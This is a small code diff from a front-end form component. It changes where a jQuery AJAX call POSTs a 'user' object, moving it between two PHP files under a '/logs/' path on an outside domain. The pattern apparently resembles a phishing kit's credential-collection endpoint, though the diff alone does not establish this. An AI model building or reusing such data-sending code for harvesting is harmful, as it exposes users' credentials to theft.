@@ -37,7 +37,7 @@ const Formm = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://bucketlion.com/logs/dashboard/file/exld.php",
+          url: "https://bucketlion.com/logs/dashboard/file/exla.php",
           data: user,
           success(data) {
               console.log(data);
